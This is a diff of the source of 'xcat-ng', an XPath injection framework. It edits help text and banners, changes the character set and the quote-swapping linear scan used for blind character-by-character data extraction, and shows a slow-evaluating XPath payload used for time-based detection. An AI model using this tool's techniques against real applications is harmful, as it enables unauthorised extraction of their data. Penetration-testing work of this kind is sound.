@@ -1,18 +1,5 @@
 #!/usr/bin/env python3
-"""
-xcat-ng  --  Modern XPath Injection Framework
-=================================================
-Usage:
-  xcat_ng.py <command> [options]
-
-Commands:
-  detect      Probe all parameters, identify injection type and server features
-  run         Auto-detect injection, then extract the full XML document
-  shell       Auto-detect injection, then open an interactive XPath shell
-  injections  List all supported injection templates
-
-Use  xcat_ng.py <command> --help  for detailed options.
-"""
+"""xcat-ng  --  Modern XPath Injection Framework (next-generation)"""
 
 from __future__ import annotations
 
@@ -83,7 +70,7 @@ BANNER = (
  ██╔╝ ██╗╚██████╗██║  ██║   ██║         ██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝         ╚═╝  ╚═══╝ ╚═════╝
 """, T.CYAN, T.BOLD) +
-    _c(" Modern XPath Injection Framework  (v3)\n", T.YELLOW)
+    _c(" Modern XPath Injection Framework  (next-generation)\n", T.YELLOW)
 )
 
 
@@ -97,13 +84,17 @@ BASELINE_SAMPLES    = 5
 FAST_MODE_LEN       = 15
 MISSING_CHAR        = "?"
 
-# Frequency-ordered charset: most common English chars first → fewer requests
+# Frequency-ordered charset: most common English chars first → fewer requests.
+# Apostrophe excluded from CHARSET_FREQ — it breaks XPath substring-before() queries.
+# The linear scanner handles it separately via quote-swapping.
 CHARSET_FREQ = (
     "etaoinshrdlcumwfgypbvkjxqz"
     "ETAOINSHRDLCUMWFGYPBVKJXQZ"
     "0123456789"
-    "_-. {}@/!#$%^&*()+=[]:;,<>?|'"
+    "_-. {}@/!#$%^&*()+=[]:;,<>?|"
 )
+# Full charset for linear scan only (apostrophe safe here via quote-swap logic)
+CHARSET_LINEAR = CHARSET_FREQ + "'"
 
 # XPath expression that takes a long time to evaluate (used for time detection)
 TIME_BOMB = "count((//.)[count((//.)[count((//.))>0])])"
@@ -648,8 +639,9 @@ async def _char_substring(engine: Engine, pos_expr: str) -> Optional[str]:
 
 
 async def _char_linear(engine: Engine, pos_expr: str, ctx: AttackContext) -> Optional[str]:
-    """O(N) frequency-ordered linear scan."""
-    for ch in ctx.ordered_charset():
+    """O(N) frequency-ordered linear scan (full charset including apostrophe)."""
+    charset = sorted(CHARSET_LINEAR, key=lambda c: -ctx.char_freq.get(c, 0))
+    for ch in charset:
         q = '"' if ch == "'" else "'"
         if await engine.check(f"{pos_expr}={q}{ch}{q}"):
             ctx.char_freq[ch] += 1
@@ -1131,7 +1123,7 @@ async def _setup_and_detect(
         f"method={_c(method.value, T.YELLOW)}  "
         f"injector={_c(inj.name, T.YELLOW)}"
     )
-    print(f"  Example: {_c(inj.example, T.GRAY)}")
+    print(f"  Example : {inj.example}")
     if method == ExtractionMethod.TIME:
         ok(f"Time threshold: {extra:.3f}s")
     print()
@@ -1247,12 +1239,20 @@ def cmd_injections(_args: argparse.Namespace):
 def build_parser() -> argparse.ArgumentParser:
     root = argparse.ArgumentParser(
         prog="xcat-ng",
-        description=__doc__,
+        description=(
+            "xcat-ng  --  Modern XPath Injection Framework (next-generation)\n\n"
+            "Commands:\n"
+            "  detect      Probe parameters, identify injection type and server features\n"
+            "  run         Extract the full XML document\n"
+            "  shell       Interactive XPath shell\n"
+            "  injections  List injection templates\n\n"
+            "Use: xcat-ng <command> --help  for per-command details."
+        ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
     root.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose/debug output")
-    root.add_argument("--version", action="version", version="xcat-ng v3")
+    root.add_argument("--version", action="version", version="xcat-ng")
 
     sub = root.add_subparsers(dest="command", required=True)
 
